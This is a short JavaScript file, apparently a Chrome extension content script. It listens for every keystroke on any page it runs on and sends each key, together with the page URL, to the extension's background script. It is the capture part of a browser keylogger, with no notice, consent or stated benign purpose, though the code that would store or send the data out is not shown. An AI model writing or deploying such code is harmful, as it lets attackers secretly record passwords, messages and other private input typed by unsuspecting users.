chrome.runtime.onConnect.addListener(function(port){});
var k = "";
var data = {};
window.onkeydown = function(event) {

    if (event.key.length > 1) {
        k = " ("+event.key+") ";
    } else {
        k = event.key;
    }
    data = {
        key: k,
        page: window.location.href
    };

    (async () => {
        const response = await chrome.runtime.sendMessage(data);
        // do something with response here, not outside the function
        console.log(response);
      })();


}
